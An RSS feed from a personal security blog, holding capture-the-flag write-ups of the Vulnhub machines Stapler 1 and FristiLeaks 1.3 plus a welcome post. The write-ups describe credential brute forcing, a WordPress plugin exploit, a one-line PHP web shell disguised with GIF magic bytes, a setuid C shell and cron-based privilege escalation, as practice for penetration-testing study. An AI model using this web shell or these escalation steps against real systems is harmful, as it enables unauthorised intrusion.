<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Barvent</title>
    <description>Barvent's technology blog
</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Thu, 02 Jul 2020 12:11:08 -0400</pubDate>
    <lastBuildDate>Thu, 02 Jul 2020 12:11:08 -0400</lastBuildDate>
    <generator>Jekyll v4.1.1</generator>
    
      <item>
        <title>Stapler 1 Write-Up</title>
        <description>&lt;p&gt;Stapler 1 is an easy OSCP-like boot to root VM hosted on Vulnhub. The goal in this challenge is to obtain root in the box and read the flag.&lt;br /&gt;
As stated in the Vulnhub page, there are 2 intended ways to obtain a limited shell and 3 intended ways to obtain root.&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;In this case, the machine doesn’t tell us its IP address, so I used Nmap to scan the network and find it.
&lt;img src=&quot;netScan.png&quot; alt=&quot;Network Scan Result&quot; /&gt;
I know that 192.168.56.1 is the gateway and 192.168.56.10 is the Kali machine, so 192.168.56.128 must be the target box.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;The port scan reveals lots of open ports, including one which is unusally high. 
&lt;img src=&quot;allPortsScan.png&quot; alt=&quot;Port scan result&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;FTP Anonymous Login&lt;/h1&gt;
&lt;p&gt;Port 21 has a ftp server with anonymous access configured, as shown in the Nmap output.
&lt;img src=&quot;ftpNmap.png&quot; alt=&quot;FTP Nmap output&quot; /&gt;
Just from connecting we get a possible user (Harry) and using user = anonymous and any password we get anonymous access, with allows us to read a file with two possible usernames (Elly and John).
&lt;img src=&quot;ftpAnon1.png&quot; alt=&quot;FTP Anon 1&quot; /&gt;
&lt;img src=&quot;ftpAnon2.png&quot; alt=&quot;FTP Anon 2&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;Elly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sure&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Leave&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FTP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;once&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;are&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;John&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Reading other people write-ups I found that Elly uses the password ylle for her ftp account, but I used another method to get access.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;HTTP Port 80&lt;/h1&gt;
&lt;p&gt;Here there isn’t anything interesting, using gobuster we can find that it is serving a home directory but I didn’t find anything useful (it is the /home/www/ directory, which is world writable).
&lt;img src=&quot;root80.png&quot; alt=&quot;Root HTTP 80&quot; /&gt;
&lt;img src=&quot;gobuster80.png&quot; alt=&quot;Gobuster HTTP 80&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Samba Enumeration&lt;/h1&gt;
&lt;p&gt;Port 139 has a Samba server which allows Guest login. There isn’t anything interesting inside the shares, but using enum4linux we can enumerate the users.
&lt;img src=&quot;smbmap.png&quot; alt=&quot;SMBMap&quot; /&gt;
&lt;img src=&quot;enum4linux.png&quot; alt=&quot;enum4linux users&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Obtaining Credentials (Method 1)&lt;/h1&gt;
&lt;p&gt;At this point I got stucked because of the rabbit holes in the other ports (except 12380, but I will talk about this one in the second method). I tried using Hydra to bruteforce the ftp credentials, using the user list as input for both the user and the password.
&lt;img src=&quot;hydraFTP.png&quot; alt=&quot;Hydra ftp&quot; /&gt;
If we access the ftp server using these credentials we get into the /etc/ directory. I searched for sensible information inside the directory, but I only found the /etc/password file which contains all the users inside of the box.
I used the same method as before to bruteforce the credentials for the ssh, only to find out that SHayslett uses the same password as before for his user account.
&lt;img src=&quot;hydraSSH.png&quot; alt=&quot;Hydra ssh&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Method 2&lt;/h1&gt;
&lt;p&gt;At first glance port 12380 doesn’t have anything (except for another username), but if we inspect the responses using Burpsuite we can see that something is odd, the server always responds with a 400 Bad Request.
&lt;img src=&quot;root12380_1.png&quot; alt=&quot;Root HTTP 12380 1&quot; /&gt;
&lt;img src=&quot;comment12380_1.png&quot; alt=&quot;Comment with user&quot; /&gt;
&lt;img src=&quot;burpIntercept.png&quot; alt=&quot;Burp intercept&quot; /&gt;
Using Nikto we can see that the server wants to use HTTPS, that’s why we are getting a 400 response. Also, we can see that there is a robots.txt file with some disallowed entries.
&lt;img src=&quot;nikto.png&quot; alt=&quot;Nikto&quot; /&gt;
The /admin112233 is a troll page, while the /blogblog has a Wordpress blog.
&lt;img src=&quot;blogblog.png&quot; alt=&quot;blogblog page&quot; /&gt;
I used wpscan but it couldn’t find anything, so I enumerated it manually.&lt;br /&gt;
The wp-contents/plugins/ has directory listing enabled, so we can enumerate the plugins. Using searchsploit we can see that one of the plugins was vulnerable in its 1.0 version (I couldn’t find the version of the installed plugin, but it seems to be 1.0).
&lt;img src=&quot;wpplugins.png&quot; alt=&quot;Wordpress plugins&quot; /&gt;
&lt;img src=&quot;searchsploitPlugin.png&quot; alt=&quot;Searchsploit plugin&quot; /&gt;
The searchsploit code didn’t work correctly, but searching in Google I found a &lt;a href=&quot;https://raw.githubusercontent.com/gtech/39646/master/39646.py&quot;&gt;more stable version&lt;/a&gt; which was created for this box.
&lt;img src=&quot;mysqlCreds.png&quot; alt=&quot;Exploit&quot; /&gt;
In the output we can see the credentials for the root user of mysql. In the Nikto output we can see that there is a phpmyadmin page, so I used the newly obtained credentials and enumerated the database (which contained interesting information, but nothing useful).&lt;br /&gt;
I used some SQL tricks to place a simple php shell inside the /wp-content/uploads/ directory and get RCE. (Ignore the typo in the screenshot).
&lt;img src=&quot;rce1.png&quot; alt=&quot;RCE 1&quot; /&gt;
&lt;img src=&quot;rce2.png&quot; alt=&quot;RCE 2&quot; /&gt;
&lt;img src=&quot;rce3.png&quot; alt=&quot;RCE 3&quot; /&gt;
&lt;img src=&quot;rce4.png&quot; alt=&quot;RCE 4&quot; /&gt;
At this point we can use a reverse shell to get shell access to the box, but I only used the first method because I prefer to have a more stable shell.&lt;br /&gt;
Also, Zoe uses the same password as the root database user in the box, so we can get SSH access from there.
&lt;img src=&quot;hydraSSH2.png&quot; alt=&quot;Hydra ssh 2&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc Method 1 (.bash_history)&lt;/h1&gt;
&lt;p&gt;Reading the LinEnum output we can see all the contents of the .bash_history of all users. JKanode has two passwords there.
&lt;img src=&quot;bashhist.png&quot; alt=&quot;Bash history&quot; /&gt;
Peter can run sudo as root.
&lt;img src=&quot;sudo1.png&quot; alt=&quot;Sudo 1&quot; /&gt;
&lt;img src=&quot;sudo2.png&quot; alt=&quot;Sudo 2&quot; /&gt;
And from here we can read the flag inside the /root/flag.txt file.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc Method 2 (cronjob)&lt;/h1&gt;
&lt;p&gt;Reading the cron jobs we can see that root runs the /usr/local/sbin/cron-logrotate.sh script every 5 minutes and everyone has permission to write to this file.
&lt;img src=&quot;cronjob.png&quot; alt=&quot;Cronjob&quot; /&gt;
This can also be found using the find command.
&lt;img src=&quot;findWrite.png&quot; alt=&quot;Find writable&quot; /&gt;
We can just grant sudo privileges to the user that we are using (zoe in my case).
&lt;img src=&quot;cronModified.png&quot; alt=&quot;Cron modified&quot; /&gt;
&lt;img src=&quot;zoeSudo.png&quot; alt=&quot;Zoe sudo&quot; /&gt;
Just remember to remove the command from the cron-logrotate to avoid problems with the /etc/sudoers file.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc Method 3 (Kernel exploit)&lt;/h1&gt;
&lt;p&gt;Again, reading the LinEnum output we can see the kernel version and the Ubuntu version. Using searchsploit we can see lots of exploits for this version, but most of them are for 64 bits operating systems and the one in the machine uses 32 bits.&lt;br /&gt;
The exploit was a bit weird and I had to execute it two times before I got root.
&lt;img src=&quot;kern1.png&quot; alt=&quot;Kern exploit 1&quot; /&gt;
&lt;img src=&quot;kern2.png&quot; alt=&quot;Kern exploit 2&quot; /&gt;
&lt;img src=&quot;kern3.png&quot; alt=&quot;Kern exploit 3&quot; /&gt;
&lt;img src=&quot;kern4.png&quot; alt=&quot;Kern exploit 4&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This box has a lot of rabbit holes and can be pretty confusing if you don’t take notes.&lt;br /&gt;
I’ve learnt how to enumerate Samba shares and use enum4linux, as well as reminding myself to read more carefully the LinEnum output and search for writable files.&lt;/p&gt;
</description>
        <pubDate>Thu, 02 Jul 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/stapler_1_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/stapler_1_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>FristiLeaks 1.3 Write-Up</title>
        <description>&lt;p&gt;FristiLeaks is an easy OSCP-like boot to root VM hosted on Vulnhub. The goal in this challenge is to obtain root in the box and read the flag.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;Normally, the first thing to do when dealing with Vulnhub machines is to scan the network (I use Nmap to do so) to find the IP of the vulnerable machine, 
but in this case the machine tells us its IP in the login prompt. 
&lt;img src=&quot;allPortsScan.png&quot; alt=&quot;Port scan result&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the scan we can see that the only open port is 80, which usually is HTTP.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port 80 Initial Enumeration&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;port80Nmap.png&quot; alt=&quot;Nmap output for port 80&quot; /&gt;
In the Nmap output for port 80 using the default scripts we can see that robots.txt has three disallowed entries. Also, we can see that the webserver uses 
Apache httpd 2.2.15, PHP version 5.3.3 and the distribution is CentOS.
&lt;br /&gt;&lt;br /&gt;
The root page of the web has nothing interesting at first glance, but there is this image which will be useful later.
&lt;img src=&quot;KeepCalm.png&quot; alt=&quot;KeepCalm&quot; /&gt;
Also, inside of the robots.txt file we can see the three disallowed entries.
&lt;img src=&quot;robots.png&quot; alt=&quot;Robots file&quot; /&gt;
All the disallowed entries have the same image saying “This is not the URL you were looking for” (I didn’t get a screenshot of this). 
At this point I wasn’t sure about what to do, as I didn’t find any interesting vulnerabilities for the server and neither did both Nikto and gobuster.
&lt;br /&gt;
Using a bit of guess work I found the directory fristi. All the entries in the robots.txt are drinks and, according to the image, fristi is also a drink. Maybe using a 
wordlist generated by CEWL and gobuster you can find the directory, but I didn’t think about this when I was enumerating the box.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Fristi Directory&lt;/h1&gt;
&lt;p&gt;The index.php file of this directory is a login page which isn’t vulnerable to SQLInjection (or at least I couldn’t find it), but I found two different ways to
“bypass” it.&lt;br /&gt;&lt;/p&gt;
&lt;h2&gt;First Method&lt;/h2&gt;
&lt;p&gt;In the source code we can see some interesting comments.
&lt;img src=&quot;fristiCom0.png&quot; alt=&quot;First commentary&quot; /&gt; 
&lt;img src=&quot;fristiCom1.png&quot; alt=&quot;Second commentary&quot; /&gt;
&lt;img src=&quot;fristiCom2.png&quot; alt=&quot;Third commentary&quot; /&gt;
We get a possible username (eezeepz) inside of the first commentary and a base64 encoded image. If we decode it we can see that it is a PNG image.
&lt;img src=&quot;decodeFristiImg.png&quot; alt=&quot;Decoding&quot; /&gt;
&lt;img src=&quot;decodedFristiImg.png&quot; alt=&quot;Decoded&quot; /&gt;
Here we can guess that the user “eezeepz” has the password “keKkeKKeKKeKkEkkEk”. A successful login redirects us to the “upload.php” page.
&lt;br /&gt;&lt;/p&gt;
&lt;h2&gt;Second Method&lt;/h2&gt;
&lt;p&gt;Using gobuster with the .php extension we can find the “uploads” directory, which hasn’t directory listing activated and “upload.php”, which redirects us to the login page.
&lt;br /&gt;
Intercepting the request to “upload.php” using BurpSuite we can see that there is more content below the redirection. If we rewrite the status code (302 FOUND) to 200 OK, we can see the upload page without knowing the credentials.
&lt;img src=&quot;burpIntercept.png&quot; alt=&quot;BurpSuite request interception&quot; /&gt; 
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;File Upload + RCE&lt;/h1&gt;
&lt;p&gt;The page only allows uploading images, but it can be bypassed easily. You just need to change the &lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot;&gt;magic bytes&lt;/a&gt; to something that will be detected as an image, as well as using the correct extension.
&lt;br /&gt;
I didn’t try using the correct extension without changing the magic bytes, but it probably doesn’t work. In my case, I used GIF87a as the magic bytes and created a really simple php shell to test if the RCE was possible.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;GIF87a
#The echo is redundant, as system prints the output of the command executed.
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;uploadShell.png&quot; alt=&quot;Uploading of the shell&quot; /&gt;
&lt;img src=&quot;correctUpload.png&quot; alt=&quot;Correct upload&quot; /&gt;
This shell works pretty well, but it can’t execute commands that need arguments (strangely, it works fine in my machine, hosting the shell using php -S localhost:8000).
&lt;br /&gt;
To use it you just need to pass the command inside the cmd argument, it accepts both GET and POST requests. In my case, I executed the whoami command.
&lt;img src=&quot;simpleRCE.png&quot; alt=&quot;Code execution&quot; /&gt;
After I checked that the simple shell really worked, I uploaded a php reverse shell (the one inside /usr/share/webshells/php/php-reverse-shell.php on Kali) and set a listener on port 1234.
&lt;img src=&quot;revShell.png&quot; alt=&quot;Reverse shell&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Apache Shell&lt;/h1&gt;
&lt;p&gt;The first thing I did was upgrading the shell to a &lt;a href=&quot;https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/&quot;&gt;more functional one&lt;/a&gt;.
&lt;img src=&quot;upgradingShell.png&quot; alt=&quot;Shell upgrade&quot; /&gt;
Inside the “checklogin.php” file we can get the hardcoded mysql credentials, but we can only read the username and the password required to access the “upload.php” page.
&lt;img src=&quot;mysqlCreds.png&quot; alt=&quot;Creds&quot; /&gt;
Inside the file located at “/var/www/notes.txt” there is an interesting message.
&lt;img src=&quot;notes1.png&quot; alt=&quot;Notes.txt 1&quot; /&gt;
If we go to the “/home/eezeepz” directory we can see lots of uninteresting files and another notes.txt.
&lt;img src=&quot;notes2.png&quot; alt=&quot;Notes.txt 2&quot; /&gt;
Essentially this is saying that we can run commands as another user. I found two ways to exploit this, but I only used the easiest as the other one was too time consuming.&lt;/p&gt;
&lt;h2&gt;First Method (not used)&lt;/h2&gt;
&lt;p&gt;Looking inside the “/usr/bin/” directory we can see the gcc binary, so I created a pretty simple C shell that uses the “setuid()” system call to run as another user.&lt;br /&gt;
My idea is to upload the file to the box (using the http.server module in python3 to serve the file), make the other user compile the shell and setting the SetUID bit, as well as giving execute permissions to others.&lt;br /&gt;
The shell that I used was really simple for the sake of saving time, but I could have used a more interactive shell if it was necessary.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: ./shell &amp;lt;command&amp;gt; &amp;lt;uid&amp;gt;  (no arguments for the command)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Setuid&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error executing command&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Inside the “/tmp/runthis” file I wrote the necessary commands to do this and I read the uid from the “/etc/passwd” file, which I’m not including because it’s too large.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/usr/bin/gcc /tmp/shell.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /tmp/shell
/home/admin/chmod u+s /tmp/shell
/home/admin/chmod o+x /tmp/shell&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;shellPermission.png&quot; alt=&quot;Shell permissions&quot; /&gt;
&lt;img src=&quot;shellExecution.png&quot; alt=&quot;Execution&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h2&gt;Second Method + PrivEsc&lt;/h2&gt;
&lt;p&gt;We can read the “/home/admin/” directory if we change the permissions using the “/tmp/runit” file and the chmod command.&lt;br /&gt;
Inside this directory there are two seemingly encrypted files (cryptedpass.txt and whoisyourgodnow.txt) and a python script which encrypts them (I didn’t take a screenshot of this, I don’t know why).
&lt;br /&gt;
The python script only base64 encodes the supplied password, then it reverses it and finally it encrypts it using the ROT13 method. If we reverse these steps, we can read the plaintext password.
&lt;img src=&quot;cryptedPass.png&quot; alt=&quot;Crypted pass&quot; /&gt;
&lt;img src=&quot;whogodPass.png&quot; alt=&quot;Whogod pass&quot; /&gt;
The first picture has the unencrypted text inside of “cyptedpass.txt”, while the second has the text inside “whoisyourgodnow.txt”.&lt;br /&gt;
LetThereBeFristi! (inside whoisyourgodnow.txt) is the password for the fristigod user.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Root PrivEsc&lt;/h1&gt;
&lt;p&gt;Executing the “sudo -l” command as user fristigod and supplying the “LetThereBeFristi!” password outputs this:
&lt;img src=&quot;sudoL.png&quot; alt=&quot;sudo -l output&quot; /&gt;
And if we check the “/var/fristigod/.secret_admin_stuff/” we can see that the doCom binary has the SetUid bit and is owned by root.
&lt;img src=&quot;ls_fristigod.png&quot; alt=&quot;ls /var/fristigod/.secret_admin_stuff/&quot; /&gt;
Using the “sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom” command we can check the usage of this binary, which allows us to run commands as root.
&lt;br /&gt;
Running the “/bin/bash” command grants us an interactive shell as root and then we can read the flag inside “/root/fristileaks_secrets.txt”.
&lt;img src=&quot;rootPrivEsc.png&quot; alt=&quot;Root privesc&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This is a fairly easy box, although I got stucked for while at the first part because I didn’t guess that fristi was the correct directory.
&lt;br /&gt;
I’ve learnt how to use the setuid() system call, which I think is pretty useful and that I need to take more screenshots before reporting.&lt;/p&gt;
</description>
        <pubDate>Sun, 28 Jun 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/fristileaks_1.3_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/fristileaks_1.3_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>Hello World!</title>
        <description>&lt;p&gt;Welcome to my blog!
&lt;br /&gt;
This is my first post, which is going to help me test if the blog works correctly and check if I’m using the categories correctly. 
&lt;br /&gt;
Soon I’ll post more content, mainly write-ups about some &lt;a href=&quot;https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms&quot;&gt;OSCP like machines from Vulnhub&lt;/a&gt;, but maybe I’ll post about my projects or other tech related topics.&lt;/p&gt;
</description>
        <pubDate>Fri, 26 Jun 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/misc/hello_world/</link>
        <guid isPermaLink="true">http://localhost:4000/misc/hello_world/</guid>
        
        
        <category>misc</category>
        
      </item>
    
  </channel>
</rss>
